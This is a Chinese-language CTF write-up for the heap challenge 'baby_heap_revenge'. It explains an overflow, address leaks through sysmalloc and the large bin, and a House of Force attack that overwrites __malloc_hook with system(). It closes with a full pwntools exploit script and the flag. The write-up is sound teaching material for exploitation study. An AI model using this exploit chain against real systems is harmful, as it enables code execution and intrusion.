## baby_heap_revenge
### solution
首先先檢查保護機制：
```
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```
由於是Full RELRO，因此無法hijack GOT。
接著分析原始碼，可以明顯看到一個在heap的8 bytes overwrite。
```c
void allocate_heap(){
    ...
	heap = malloc(size);
	if(heap){
		...
		read_input(heap,size+8);
        ...
```
再來，有無限次的`malloc()`，但沒有任何`free()`，以及可以隨時看最後一次`malloc()`位址的內容，最後加上提示是使用The house of force，先大概可以整理出以下思路。

1. 試圖overwrite top chunk的size
2. leak出heap的位址
3. 試圖leak stack，使chunk落在satck使用ROP，或是試著leak libc，改寫`__malloc_hook`

首先是overwrite top chunk的`size`，因為8bytes理論上只能蓋掉`prev_size`，但是用類似off-by-one[1]的技巧，當`malloc()`的大小沒有對齊`MINSIZE`(0x10)的時候，會和後一塊chunk共用`prev_size`的空間，導致多出來的bytes就可以繼續往後寫入到`size`。因此，我們只要分配的大小尾數是0x8，後8bytes會跟top chunk的`prev_size`共用，多出來的8bytes就可以蓋掉top chunk的`size`。

接著問題在於如何leak出heap的位址？由於在不知道heap offset的狀況不可能利用the house of force來跳到其他segment，因此通常需要利用`free()`來在heap上產生bin chunk的pointer，但是程式中沒有任何`free()`，因此無法達成。

然而，實際上在`sysmalloc()`中，若是滿足特定條件則會呼叫`_int_free()`，因此若是能偽造相關條件，則可以在`malloc()`時呼叫`_int_free()`產生unsorted bin chunk，我們即可藉此leak出heap的位址，同時因為有link會指向`main_arena`，因此也可以用來計算出libc的位址。

根據`sysmalloc()`的source code，可以推出constraint為：

* alloc size < `mmap_threshold`

* alloc size + `MINSIZE` > top chunk size > `MINSIZE`

* `PREV_INUSED` is set

* top address + size需要對齊page大小

由於剛切出來的top chunk會大於`mmap_threshold`(128KB)，因此我們可以直接先將top chunk size寫小，而由於還需要滿足align page boundary的條件，原則上不要動到原本大小的最後幾個bytes，因此最後fake top size應該寫為`size & (pagesize - 1) | PREV_INUSED`，接著任意`malloc()` size > fake top size即可。

我們可以使`alloc size = fake top size + 0x8`，如此一來可以同時再次將top size寫為`0xffffffffffffffff`，以用於稍後的the house of force attack。

```
overwrite top chunk to a smaller size
|--------------| <- first chunk data
|  "aaaaaaaa"  |
|  "aaaaaaaa"  | <- top chunk (shared prev_size)
|   fake_size  |
|--------------|
```

在第二次`malloc()`後，原本的top chunk在`_int_free()`後會被放入unsorted bin中，而會有FD和BK指向main_arena。
```
after sysmalloc triggers _int_free
|--------------| <- first chunk data
|  "aaaaaaaa"  |
|  "aaaaaaaa"  | <- unsorted bin
|   fake_size  |
|      FD      |
|      BK      |
|--------------|
    ........
|--------------| <- new top chunk
|   ........   |
|  -1(0xff...) |
|--------------|
```
而在第三次`malloc()`時，要是request large bin的大小，會使得該chunk先從unsorted bin被移入large bin中，此時會額外多了兩個link `fd_nextsize`和`bk_nextsize`指向heap上前一塊chunk，之後我們拿到該chunk時，這些link會遺留著，我們就可以leak出heap address。
```
after process unsorted bin
|--------------| <- first chunk data
|  "aaaaaaaa"  |
|  "aaaaaaaa"  | <- large bin (shared prev size)
|     size     |
|      FD      |
|      BK      |
|  fd_nextsize |
|  bk_nextsize |
|--------------|

split large chunk and return
|--------------| <- first chunk data
|  "aaaaaaaa"  |
|  "aaaaaaaa"  | <- second chunk header
|     size     |
|      FD      | <- second chunk data
|      BK      |
| fd_nextsize  |
| bk_nextsize  |
|   prev_size  | <- last remainder
|     size     |
|--------------|

overwrite
|--------------| <- first chunk data
|  "aaaaaaaa"  |
|  "aaaaaaaa"  | <- second chunk header
|     size     |
|  "cccccccc"  | <- second chunk data
|  "ADDRESS:"  |
| fd_nextsize  | <----- leak here
| bk_nextsize  |
|   prev_size  | <- last remainder
|     size     |
|      FD      |
|      BK      |
|--------------|
```

在第三次`malloc()`，我們再繼續往下拿，chunk會繼續從last remainder中切出來，則可以leak出`main_arena` address算出libc。
```
allocate third chunk and overwrite
|--------------| <- first chunk data
|  "aaaaaaaa"  |
|  "aaaaaaaa"  | <- second chunk header
|     size     |
|  "cccccccc"  | <- second chunk data
|  "ADDRESS:"  |
| fd_nextsize  |
| bk_nextsize  |
|   prev_size  | <- 3rd chunk header
|     size     |
|  "ADDRESS:"  | <- 3rd chunk data
|      BK      | <----- leak here
|   prev_size  | <- last remainder
|     size     |
|--------------|
```

到此，已經知道heap和libc address了，因此接下來可以試著使用the house of force去修改`__malloc_hook`。

首先嘗試直接寫成one gadget，有三個依賴stack的gadget可用：
```
0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL
0xf0274 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL
0xf1117 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```
但在測試後全部都無法滿足。

接著，再試著改將`__malloc_hook`寫為`system()`，則只要將libc中`sh`的位址作為`malloc()`的大小傳入即可執行`system("sh")`，但在debug時又發現`system("sh")`在執行時又會觸發`malloc()`導致無窮迴圈，因此最後嘗試直接將`"cat /home/baby_heap_revenge/flag"`寫到heap上，接著使用`malloc()`觸發`system("cat /home/baby_heap_revenge/flag")`，就成功地拿到了flag。

所以，這部份先進行the house of force的利用，new top必須落在`__malloc_hook - 0x10`(扣掉chunk header)，因此`malloc()`大小為`__malloc_hook - old_top - 0x20`，若在此時同時將`cat /home/baby_heap_revenge/flag`寫到heap上，則他的位址會是`old_top + 0x10`(加上chunk header)。

成功後，再次`malloc()`拿到的chunk data就會指到`__malloc_hook`(大小需要大於之前last remainder還剩下的部份)，寫為`system()`即可。最後，將`old_top + 0x10`作為`malloc()`的size再呼叫一次就可以看到flag了。


最後整理一下步驟：

1. 第一次`malloc()`，將top size寫為`top size & (pagesize - 1) | PREV_INUSED`
2. 第二次`malloc()`，大小為`fake top size + 0x8`，並將top size寫為`0xffffffffffffffff`
3. 第三次`malloc()`，取得指向原本在unsorted bin中的chunk的chunk，leak heap address
4. 第四次`malloc()`，在上一塊chunk下方再取得一塊chunk，leak main_arena address並算出libc base。
5. 第五次`malloc()`，利用the house of froce使新的top chunk指向`__malloc_hook - 0x10`，同時將`cat /home/baby_heap_revenge/flag`寫到heap上。
6. 第六次`malloc()`，size必須大於之前large bin剩下的chunk size，控制`__malloc_hook`並寫為`system()`
7. 第七次`malloc()`，將之前寫的string address作為size，觸發`__malloc_hook`執行`system("cat /home/baby_heap_revenge/flag")`

### flag
```
FLAG{YOUARENOTBABYATALL}
```
### script
```python
#!/usr/bin/env python3
from pwn import *

context(arch="amd64", terminal=["tmux", "neww"])

#r = process("baby_heap_revenge")
r = remote("csie.ctf.tw", 10141)
libc = ELF("libc.so.6")

def send(s):
    r.recvuntil(":")
    r.send(s)

def allocate(size, data):
    send("1")
    send(str(size))
    send(data)

def show():
    send("2")

def leak():
    show()
    r.recvuntil('ADDRESS:')
    return u64(r.recvuntil('\n', drop=True).ljust(8, b'\x00'))

# 1. overwrite the size of top chunk to a small value
#    to trigger _int_free() in sysmalloc(), we will
#    get a unsorted bin chunk, also overwrite the new top
PREV_INUSED = 1
TOP_SIZE = 0x20fe0
PAGESIZE = 0x1000
SMALL_TOP_SIZE = TOP_SIZE & (PAGESIZE - 1)
allocate(0x18, b'a' * 0x18 + p64(SMALL_TOP_SIZE | PREV_INUSED))
LARGE_TOP_SIZE = 0xffffffffffffffff
allocate(SMALL_TOP_SIZE + 0x8, b'b' * (SMALL_TOP_SIZE + 0x8) + p64(LARGE_TOP_SIZE))

# 2. Using the unsorted bin chunk to leak address of heap.
#    Also, there is address of main_arena on the heap, it
#    can be used to compute libc address
allocate(0x20, b'c' * 0x8 + b'ADDRESS:')
heap_addr = leak()
top_addr = heap_addr + 0x21fd0
allocate(0x10, b'ADDRESS:')
arena_addr = leak()
libc_base = arena_addr - 0x3c4b78

# 3. Using the house of force to get a chunk point to __malloc_hook.
#    Write the string to be executed by system() on heap meanwhile.
#    Finally, make __malloc_hook point to system(), pass the string
#    as malloc() argument, then trigger malloc()
# Note : we can't simply execute system("sh") since it will trigger
#        another malloc() during execution, and result in a infinite loop.
__malloc_hook = libc_base + libc.symbols[b'__malloc_hook']
offset = __malloc_hook - top_addr - 0x20
allocate(offset, b'cat /home/baby_heap_revenge/flag\x00')
str_addr = top_addr + 0x10
allocate(0xff8, p64(libc_base + libc.symbols[b'system']))

# 4. use malloc to trigger hook, don't use allocate() here since it will
#    failed to receive the prompt of data
send("1")
send(str(str_addr))

r.interactive()
```
### Reference
* [Off-By-One Vulnerability (Heap Based)](https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/)
    for using unaligned chunk size to overwrite `size` idea
* [HITCON CTF Qual 2016 - House of Orange Write up](
http://4ngelboy.blogspot.tw/2016/10/hitcon-ctf-qual-2016-house-of-orange.html)
    for using `sysmalloc` to trigger `_int_free` idea
    "Awesome technique, very impressive!"
